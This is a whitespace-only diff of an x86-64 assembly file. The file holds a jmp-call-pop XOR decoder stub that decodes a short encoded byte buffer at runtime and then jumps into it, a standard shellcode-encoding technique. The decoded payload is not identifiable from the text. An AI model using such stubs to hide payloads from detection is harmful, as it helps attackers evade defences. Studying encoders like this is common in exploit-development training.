@@ -5,27 +5,27 @@ global _start
 
 
 _start:
-    jmp     short _get_addr      
+    jmp     short _get_addr
 
 _decoder:
-    pop     rsi               
-    push    rsi                 
-    mov     cl, BUFFER_SIZE     
-    
+    pop     rsi
+    push    rsi
+    mov     cl, BUFFER_SIZE
+
 _loop:
-    mov     al, cl             
-    neg     al                 
-    add     al, XOR_KEY                    
-    add     al, BUFFER_SIZE & 0xFF 
-    xor     byte [rsi], al      
-    inc     rsi                 
-    loop    _loop               
-    
-    pop     rsi                
-    jmp     rsi                 
-    
+    mov     al, cl
+    neg     al
+    add     al, XOR_KEY
+    add     al, BUFFER_SIZE & 0xFF
+    xor     byte [rsi], al
+    inc     rsi
+    loop    _loop
+
+    pop     rsi
+    jmp     rsi
+
 _get_addr:
-    call    _decoder           
+    call    _decoder
 
 encoded_buffer:
     db 0x66, 0x60, 0x60, 0x6D, 0x71, 0xB3, 0xDE, 0xD4, 0x3D, 0x3E, 0x3F, 0x40, 0x1F, 0x0A, 0xC0, 0x82
